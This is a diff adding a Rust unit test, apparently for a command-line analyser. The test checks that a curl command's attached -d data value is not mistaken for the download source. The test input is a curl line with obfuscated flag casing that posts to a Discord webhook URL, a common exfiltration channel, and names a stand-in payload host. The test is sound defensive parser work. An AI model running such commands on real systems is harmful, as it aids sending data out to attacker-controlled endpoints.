@@ -5820,6 +5820,29 @@ mod curl_tests {
     }
 
     #[test]
+    fn curl_attached_data_payload_does_not_become_download_output() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl --OuTpUt NUL -dhttp://payload.example/not-download https://discord.com/api/webhooks/abc"#,
+            &mut env,
+        );
+        let downloads: Vec<_> = env
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::Download { src, dst, .. } => Some((src.as_str(), dst.as_deref())),
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            downloads,
+            vec![("https://discord.com/api/webhooks/abc", Some("NUL"))],
+            "traits: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_form_fields_do_not_become_download_src() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
